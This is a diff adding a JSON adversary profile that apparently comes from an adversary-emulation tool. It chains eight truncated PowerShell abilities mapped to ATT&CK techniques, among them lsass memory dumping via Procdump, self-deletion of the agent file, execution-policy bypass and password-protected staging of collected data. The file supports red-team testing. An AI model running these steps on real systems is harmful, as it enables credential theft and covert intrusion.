@@ -1,0 +1,84 @@
+{
+  "saved": true,
+  "adversary": {
+    "adversary_id": "temp-seed-zqahqp-1775125295",
+    "name": "Temp Seed Windows - APT5 Auto Profile Windows",
+    "description": "Auto-generated seed adversary from c23f2861-b01c-4be4-a883-dd65855f9c3f for agent zqahqp",
+    "atomic_ordering": [
+      "05cda6f6-2b1b-462e-bff1-845af94343f7",
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+      "30a8cf10-73dc-497c-8261-a64cc9e91505",
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+      "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc"
+    ]
+  },
+  "selected_abilities": [
+    {
+      "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+      "name": "Discover injectable process",
+      "tactic": "discovery",
+      "technique_id": "T1057",
+      "noisy_score": 9,
+      "command_preview": "$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; $ps = get-process |…"
+    },
+    {
+      "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "name": "Deadman - Delete agent file",
+      "tactic": "defense-evasion",
+      "technique_id": "T1070.004",
+      "noisy_score": 3,
+      "command_preview": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup; $startupInfo = New-CimInstance -CimCl…"
+    },
+    {
+      "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+      "name": "Find System Network Connections",
+      "tactic": "discovery",
+      "technique_id": "T1049",
+      "noisy_score": 3,
+      "command_preview": "netstat -anto; Get-NetTCPConnection"
+    },
+    {
+      "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505",
+      "name": "Compress staged directory (Password Protected)",
+      "tactic": "collection",
+      "technique_id": "T1560.001",
+      "noisy_score": 1,
+      "command_preview": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archiv…"
+    },
+    {
+      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "name": "Create staging directory",
+      "tactic": "collection",
+      "technique_id": "T1074.001",
+      "noisy_score": 1,
+      "command_preview": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Obj…"
+    },
+    {
+      "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+      "name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "technique_id": "T1083",
+      "noisy_score": 1,
+      "command_preview": "Get-ChildItem -Path #{host.system.path}"
+    },
+    {
+      "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "name": "Leverage Procdump for lsass memory",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "noisy_score": 1,
+      "command_preview": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\"; $download_folder = \"C:\\Users\\Publ…"
+    },
+    {
+      "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "name": "Emulate Administrator Tasks",
+      "tactic": "execution",
+      "technique_id": "T1059.001",
+      "noisy_score": 0,
+      "command_preview": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrat…"
+    }
+  ]
+}
